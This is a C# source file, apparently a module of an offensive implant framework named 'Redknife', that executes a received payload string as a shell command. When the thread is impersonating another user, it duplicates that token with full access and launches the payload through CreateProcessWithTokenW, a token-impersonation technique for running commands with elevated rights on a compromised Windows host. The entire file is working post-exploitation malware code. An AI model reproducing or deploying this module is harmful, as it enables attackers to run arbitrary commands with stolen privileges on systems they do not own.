using System;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using Redknife.APIs;

namespace Redknife.Modules
{

    public class ExecuteShellCommand : BaseModule
    {

        private static string PROCESS_INFO_REGEX = @"(?<exe>""[^""]+""|[^ ]+) ?(?<args>.*)?";

        public override void Run()
        {
            LogUtil.Info("Executing shell command module...");

            string payloadStr = System.Text.Encoding.ASCII.GetString(this.Payload);

            ProcessStartInfo processInfo = null;
            try
            {
                processInfo = ParseProcessInfo();
            } catch (Exception ex)
            {
                LogUtil.Error(ex.ToString());
                LogUtil.Error(ex.GetBaseException().ToString());
            }

            LogUtil.Debug("Launching executable: {0}, with args: {1}", 0, processInfo.FileName, processInfo.Arguments);

            // Get the current thread token
            IntPtr hToken;
            Advapi32.OpenThreadToken(Kernel32.GetCurrentThread(), 0xF01FF, false, out hToken);

            // Non-zero value indicates current thread is using impersonation - use CreateProcessWithTokenW method
            if (hToken != IntPtr.Zero)
            {
                ImpersonationAwareCreateProcess(hToken, payloadStr);
            }
            else
            {
                Process.Start(processInfo);
            }
        }

        protected void ImpersonationAwareCreateProcess(IntPtr currentThreadToken, string payloadStr)
        {
            LogUtil.Info("Current thread has impersonation privilege - executing process with token");

            IntPtr hSystemToken = IntPtr.Zero;
            Advapi32.DuplicateTokenEx(currentThreadToken, Advapi32.TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out hSystemToken);

            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = Kernel32.GetSystemDirectory(sbSystemDir, 256);
            if (res1 == 0)
            {
                LogUtil.Error("ERROR calling GetSystemDirectory: " + Marshal.GetLastWin32Error());
                return;
            }
            LogUtil.Info("System directory is: " + sbSystemDir.ToString());

            // Create the environment
            IntPtr env = IntPtr.Zero;
            bool res = UserEnv.CreateEnvironmentBlock(out env, hSystemToken, false);
            if (res == false)
            {
                LogUtil.Error("ERROR calling CreateEnvironmentBlock: " + Marshal.GetLastWin32Error());
                return;
            }

            String name = WindowsIdentity.GetCurrent().Name;
            LogUtil.Info("Impersonated user is: " + name);
            Advapi32.RevertToSelf();

            Advapi32.PROCESS_INFORMATION pi = new Advapi32.PROCESS_INFORMATION();
            Advapi32.STARTUPINFO si = new Advapi32.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";

            LogUtil.Info("Calling CreateProcessWithTokenW - payload: " + payloadStr);
            bool ret = Advapi32.CreateProcessWithTokenW(hSystemToken, Advapi32.LogonFlags.WithProfile, null, payloadStr, Advapi32.CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
            if (ret == false)
            {
                LogUtil.Debug("Create process with token failed: " + Marshal.GetLastWin32Error(), 1);
            } else
            {
                LogUtil.Debug("Executed with impersonated token: " + payloadStr);
            }
        }

        public ProcessStartInfo ParseProcessInfo()
        { 
            string payloadStr = System.Text.Encoding.ASCII.GetString(this.Payload);

            ProcessStartInfo processInfo = new ProcessStartInfo();

            Regex rx = new Regex(PROCESS_INFO_REGEX, RegexOptions.Compiled);
            MatchCollection matches = rx.Matches(payloadStr);
            if (matches.Count > 0)
            {
                Match match = matches[0];
                processInfo.FileName = match.Groups["exe"].Value;
                processInfo.Arguments = match.Groups["args"].Value;
            } 

            return processInfo;
        }
        
    }
}
